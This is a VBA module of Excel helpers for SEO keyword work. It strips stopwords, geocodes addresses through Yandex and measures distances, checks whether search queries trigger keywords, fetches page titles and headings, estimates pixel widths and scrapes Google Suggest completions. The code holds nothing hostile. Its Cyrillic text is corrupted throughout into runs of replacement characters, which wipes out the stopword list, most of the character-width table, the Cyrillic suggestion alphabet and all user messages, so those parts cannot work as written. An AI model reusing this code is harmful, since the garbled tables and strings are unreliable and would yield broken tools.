|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & " " & _
"|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd|" & " " & _
"|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd|"
End Function
Private Function absentWords(w1 As String, w2 As String)
Dim a1() As String, a2() As String, i As Long, j As Long
a1 = Split(w1)
a2 = Split(w2)
For i = LBound(a1) To UBound(a1)
    For j = LBound(a2) To UBound(a2)
        If a1(i) = a2(j) Then a1(i) = ""
    Next j
Next i
absentWords = WStrim(Join(a1, " "))
End Function
Private Function EncodeURL(ByVal iTXT As String) As String
    Dim i As Long, x As String, y As String
    iTXT = VBA.Trim(Replace(iTXT, Chr(160), " "))
    For i = 1 To Len(iTXT)
        x = Mid(iTXT, i, 1)
        Select Case AscW(x)
            Case Is > 256: y = "%" & Hex(AscW(x) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(x) Mod 64)
            Case 32: y = "+"
            Case Else: y = x
        End Select
        EncodeURL = EncodeURL & y
    Next i
End Function
Private Function CheckSymbol(ByVal iSTR As String) As String
    iSTR = VBA.Trim(iSTR)
    iSTR = Replace(iSTR, " ", "")
    iSTR = Replace(iSTR, "-", "")
    iSTR = Replace(iSTR, "+", "")
    iSTR = Replace(iSTR, ".", "")
    iSTR = Replace(iSTR, ",", "")
    CheckSymbol = IIf(IsNumeric(iSTR), "latlng", "address")
End Function
Private Function koordinatyyandyekskart(ByVal iAdress As String)
'https://tech.yandex.ru/maps/doc/geocoder/desc/concepts/input_params-docpage/

    Dim XMLDoc As Object, iURL As String, strXML As String, tmpArray, r
    On Error Resume Next

    ReDim tmpArray(1 To 3): DoEvents
    iURL = "http://geocode-maps.yandex.ru/1.x/?geocode=" & iAdress & "&format=xml&lang=ru_RU&results=1"
    
    Set XMLDoc = CreateObject("MSXML2.DOMDocument")
    XMLDoc.async = False
    
    If XMLDoc.Load(iURL) = True Then
        With XMLDoc.DocumentElement
            'poluchayem koordinaty
            strXML = .SelectSingleNode("//Point/pos").Text
            r = Split(strXML, " ", , vbTextCompare)
            tmpArray(1) = r(1): tmpArray(2) = r(0)
            
            'poluchayem normalnyy adryes
            tmpArray(3) = .SelectSingleNode("//metaDataProperty/GeocoderMetaData/text").Text
        End With
    Else
        tmpArray(1) = "": tmpArray(2) = "": tmpArray(3) = ""
        Application.Wait Time:=Now + TimeSerial(0, 0, 0.5)    'pauza 0.5 syek.
    End If
    
    koordinatyyandyekskart = Join(tmpArray, "\")
    Set XMLDoc = Nothing: Erase tmpArray
End Function
Private Function rasstoyaniyepokoordinatam(lat1 As Double, lat2 As Double, long1 As Double, long2 As Double) As Double
rasstoyaniyepokoordinatam = Round(6371 * WorksheetFunction.Acos( _
Cos(WorksheetFunction.Radians(90 - lat1)) * Cos(WorksheetFunction.Radians(90 - lat2)) + _
Sin(WorksheetFunction.Radians(90 - lat1)) * Sin(WorksheetFunction.Radians(90 - lat2)) * Cos(WorksheetFunction.Radians(long1 - long2)) _
), 3)
End Function
Private Function rasstoyaniyemyezhduadryesami(address1 As String, address2 As String) As String
Dim lat1 As Double, lat2 As Double, long1 As Double, long2 As Double, a1() As String, a2() As String
a1 = Split(Replace(koordinatyyandyekskart(address1), ".", ","), "\")
a2 = Split(Replace(koordinatyyandyekskart(address2), ".", ","), "\")
lat1 = CDbl(a1(0))
lat2 = CDbl(a2(0))
long1 = CDbl(a1(1))
long2 = CDbl(a2(1))
rasstoyaniyemyezhduadryesami = rasstoyaniyepokoordinatam(lat1, lat2, long1, long2)
End Function
Private Function getSqBracketed(kwd As String) As String
Dim x As Long
x = InStr(1, kwd, "[") + 1
getSqBracketed = Mid(kwd, x, InStr(1, kwd, "]") - x)
End Function
Private Function hasMDFs(x) As Boolean
hasMDFs = False
If InStr(1, x, """") + InStr(1, x, "[") > 0 Then hasMDFs = True
End Function
Private Function remMinusWords(x As String) As String
remMinusWords = removeAfterIncluding(x, " -")
End Function
Private Function byezstopslov(s As String)
Dim x As Variant, i As Long, j As Long, r As Long, pauseStart As Long, pauseEnd As Long
Dim a() As String
a = Split(stopwords())
x = Split(s, " ")
    If InStr(1, s, """") > 0 Then
        byezstopslov = s
        Exit Function
    End If
pauseStart = 20
pauseEnd = -1
For i = LBound(x) To UBound(x)
    If InStr(1, x(i), "[") > 0 Then pauseStart = i
    If InStr(1, x(i), "]") > 0 Then pauseEnd = i
Next
For i = LBound(x) To UBound(x)
    If IsInArray(x(i), a) = True And (i < pauseStart Or i > pauseEnd) Then x(i) = ""
Next
byezstopslov = WStrim(Join(x, " "))
End Function
Private Function substring(word As String, x As Long, n As Long) As String
Dim a() As String, i As Long
a = Split(word & " ")
If x + n > UBound(a) Then Exit Function Else substring = a(x)
For i = LBound(a) To UBound(a)
    If i > x And i < (x + n) Then substring = substring & " " & a(i)
Next i
End Function
Private Function willTrigger(q As String, kwd As String) As Boolean
Dim arr() As String, mWordArr() As String
willTrigger = False
'kvadratnyye skobki byez opyeratorov
If InStr(1, kwd, "[") > 0 Then
    If InStr(1, q, getSqBracketed(kwd)) > 0 Then willTrigger = True Else Exit Function
End If
'tochnoye sootvyetstviye byez opyeratorov
If Left(kwd, 1) = """" Then
    If WordDiff(q, byezkavychyek(byezkvadrskobok(kwd))) = 0 Then
        willTrigger = True
        Exit Function
    Else:
        Exit Function
    End If
End If
'shirokoye byez opyeratorov
If isChild(q, byezkvadrskobok(byezstopslov(removeAfterIncluding(kwd, " -")))) = False Then
    willTrigger = False
    Exit Function
    Else:
    willTrigger = True
End If
'minus-slova
arr = Split(q, " ")
mWordArr = Split(Mid(kwd & " -", InStr(1, kwd & " -", " -", vbBinaryCompare), Len(kwd & " -")), " -")
For i = LBound(arr) To UBound(arr)
    If IsInArray(arr(i), mWordArr) Then
    willTrigger = False
    Exit For
    End If
Next i
End Function
Private Function getTitle(strURL As String) As String

Dim stPnt As Long, x As String
Dim oXH As Object
'Get URL's HTML Source
Set oXH = CreateObject("msxml2.xmlhttp")
With oXH
    .Open "get", strURL, False
    .Send
    x = .responseText
End With
Set oXH = Nothing
'Parse HTML Source for Title
If InStr(1, UCase(x), "<TITLE>") Then
    stPnt = InStr(1, UCase(x), "<TITLE>") + Len("<TITLE>")
    getTitle = Mid(x, stPnt, InStr(stPnt, UCase(x), "</TITLE>") - stPnt)
Else
    getTitle = ""
End If

End Function
Private Function getH1(strURL As String) As String

Dim stPnt As Long, ePnt As Long, x As String
Dim oXH As Object
'Get URL's HTML Source
Set oXH = CreateObject("msxml2.xmlhttp")
With oXH
    .Open "get", strURL, False
    .Send
    x = .responseText
End With
Set oXH = Nothing
    getH1 = rgxReplace(rgxExtract(x, "<h1.+</h1>"), "<.+?>", "")
End Function
Private Function getDescr(strURL As String) As String
Dim stPnt As Long, x As String
Dim oXH As Object
'Get URL's HTML Source
Set oXH = CreateObject("msxml2.xmlhttp")
With oXH
    .Open "get", strURL, False
    .Send
    x = .responseText
End With
Set oXH = Nothing
'Parse HTML Source for Description
End Function

Private Function getHttpResponse(url As String)
Dim oRequest As Object
On Error GoTo Err_DoSomeJob
Set oRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
With oRequest
    .Open "GET", url, True
    .SetRequestHeader "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"
    .Send "{range:9129370}"
    .WaitForResponse
    getHttpResponse = oRequest.Status
    End With
Exit_DoSomeJob:
On Error Resume Next
    Set oRequest = Nothing
    Exit Function
Err_DoSomeJob:
    getHttpResponse = Err.Description
    Resume Exit_DoSomeJob
End Function
Private Function ydPixelLength2(r As Range) As Long
    Dim myTxt As String, x As Long, i As Long, arr1(), arr2(), arr3(), dict1 As Object, dict2 As Object
    
    myTxt = r.Text

    arr1 = Array(" ", "!", "$", "%", "&", "(", ")", "*", "+", ",", "-", ".", "/", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ":", ";", "<", "=", ">", _
"?", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", _
"Z", "_", "`", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", _
"y", "z", "|", "~", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
"|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
"|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
"|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", ChrW(8381))
    
    arr2 = Array(7, 8, 13, 21, 16, 8, 8, 9, 14, 7, 8, 7, 7, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 7, 7, 14, 14, 14, 13, 15, 16, 17, 17, 16, _
15, 19, 17, 6, 12, 16, 13, 19, 17, 19, 16, 19, 17, 16, 14, 17, 15, 23, 15, 16, 15, 13, 8, 13, 14, 12, 14, 13, 7, 14, 14, _
5, 6, 12, 6, 20, 14, 13, 14, 14, 8, 12, 7, 14, 11, 17, 11, 12, 12, 6, 14, 18, 13, 18, 10, 13, 16, 17, 6, 6, 15, 16, 16, 13, _
16, 16, 22, 15, 17, 17, 14, 16, 19, 17, 19, 17, 16, 17, 14, 15, 18, 15, 18, 16, 22, 23, 19, 21, 16, 17, 24, 17, 13, 14, _
13, 9, 14, 13, 16, 11, 13, 13, 11, 14, 17, 13, 13, 13, 14, 12, 11, 12, 20, _
11, 14, 13, 19, 20, 15, 17, 13, 12, 18, 13, 13, 12, 5, 6, 12, 10, 13, 5, 26, 24, 24, 13)

    arr3 = Array(7, 7, 13, 18, 17, 8, 8, 9, 14, 7, 8, 7, 7, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 7, 7, 14, 14, 14, 15, 17, 17, 17, 17, 16, 15, 19, _
17, 7, 13, 17, 15, 21, 17, 18, 16, 18, 17, 16, 15, 17, 16, 23, 16, 15, 14, 13, 8, 13, 15, 13, 15, 13, 8, 15, 15, 7, 7, 13, 7, 21, _
15, 15, 15, 15, 9, 13, 8, 15, 13, 19, 13, 13, 12, 7, 14, 18, 13, 18, 10, 13, 16, 17, 7, 7, 17, 17, 17, 14, 17, 16, 21, 15, 17, 17, _
15, 17, 21, 17, 18, 17, 16, 17, 15, 15, 21, 16, 18, 17, 25, 25, 21, 23, 17, 17, 25, 17, 13, 15, 15, 10, 15, 13, 17, 12, _
15, 15, 12, 15, 19, 15, 15, 15, 15, 13, 11, 13, 21, 13, 15, 14, 21, 21, 18, 21, 15, 13, 21, 14, 13, 13, 7, 7, 12, 11, 13, 7, 27, 24, 24, 13)

    Set dict1 = CreateObject("Scripting.Dictionary")
    Set dict2 = CreateObject("Scripting.Dictionary")
    
    For i = LBound(arr1) To UBound(arr1)
        If dict1.exists(arr1(i)) Then
        Else
            dict1.Add arr1(i), arr2(i)
            dict2.Add arr1(i), arr3(i)
        End If
    Next
    
    x = 0
    
    For i = 1 To Len(myTxt)
        If r.Characters(i, 1).Font.bold = True Then
            x = x + dict2.item(Mid(myTxt, i, 1))
        Else:
            x = x + dict1.item(Mid(myTxt, i, 1))
        End If
    Next
ydPixelLength2 = x
End Function
Private Function extrNthWord(x As String, n As Long)
Dim arr() As String
arr = Split(x, " ")
extrNthWord = arr(n - 1) & " "
End Function
Private Function remNthWord(x As String, n As Long)
Dim arr() As String, i As Long
arr = Split(x, " ")
For i = LBound(arr) To UBound(arr)
    If i <> n - 1 Then remNthWord = remNthWord & " " & arr(i)
Next i
remNthWord = Trim(remNthWord)
End Function
Private Sub PermuteSeveralWords()
    Dim xStr As String, FRow As Long, arr(), i As Long, totalcount As Long
    arr = Selection.Value2
With Worksheets.Add
    .name = "output"
End With
    For i = LBound(arr) To UBound(arr)
        totalcount = totalcount + WorksheetFunction.Permut(slov(CStr(arr(i, 1))), slov(CStr(arr(i, 1))))
    Next i
    If totalcount > 1048576 Then
        MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!"
        Exit Sub
    Else
        FRow = 1
        For i = LBound(arr) To UBound(arr)
        Call GetWordPermutation("", CStr(arr(i, 1)), FRow)
        Next i
    End If
End Sub
Private Sub GetWordPermutation(Str1 As String, str2 As String, ByRef xrow As Long)
    Dim i As Long, xLen As Long
    xLen = slov(str2)
    If xLen < 2 Then
        Range("A" & xrow) = Str1 & str2
        xrow = xrow + 1
    Else
        For i = 1 To xLen
            Call GetWordPermutation(Str1 + extrNthWord(str2, i), remNthWord(str2, i), xrow)
        Next
    End If
End Sub
'''''''''''''''''''''

'S U G G E S T


'''''''''''''''''''''
Sub GoogleSuggestDeep()
GoogleSuggest True
End Sub
Sub GoogleSuggest(Optional deep As Boolean = False)
    Dim XDoc As Object
    Dim gquery As String
    Dim phrase As String
    Dim dict As Object
    Dim arrsymbols()
    Dim i As Long
'|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Dim barCurrProg As Double
Dim barProgPerc As Double
Dim barWidth As Long

If deep = True Then
    arrsymbols = Array(" ", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z", _
"1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
"|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", _
"|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|")
 Else
     arrsymbols = Array(" ", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
    "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0")
 End If
    Set dict = CreateObject("Scripting.Dictionary")
    phrase = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:", "|fffd||fffd||fffd||fffd||fffd||fffd|", Type:=2)
OptimizeON
'|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Call InitProgressBar
    For i = 1 To UBound(arrsymbols)
    '1 |fffd||fffd||fffd||fffd||fffd||fffd|
        Set XDoc = CreateObject("MSXML2.DOMDocument")
        gquery = "http://suggestqueries.google.com/complete/search?output=toolbar&hl=ru&q=" & phrase & " " & arrsymbols(i)
        XDoc.async = False: XDoc.validateOnParse = False
        XDoc.Load (gquery)
        Set lists = XDoc.DocumentElement
         
    For Each listNode In lists.ChildNodes
            For Each fieldnode In listNode.ChildNodes
                If dict.exists(fieldnode.XML) Then
                Else: dict.Add fieldnode.XML, ""
                End If
            Next fieldnode
    Next listNode
        Set XDoc = Nothing
    Pause (0.1)
'|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    barCurrProg = i / UBound(arrsymbols)
    barWidth = Progress.Border.Width * barCurrProg
    barProgPerc = Round(barCurrProg * 100, 0)
    Progress.Bar.Width = barWidth
    Progress.Text.Caption = barProgPerc & "% Complete"
Next i
'|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Unload Progress
    With Worksheets.Add
        .[a1].Resize(dict.Count) = Application.Transpose(dict.Keys)
    End With
    Columns("A:A").Replace What:="<suggestion data=""", Replacement:="", LookAt:= _
        xlPart, SearchOrder:=xlByRows, MatchCase:=True, SearchFormat:=False, _
        ReplaceFormat:=False
    Columns("A:A").Replace What:="""/>", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=True, SearchFormat:=False, _
        ReplaceFormat:=False
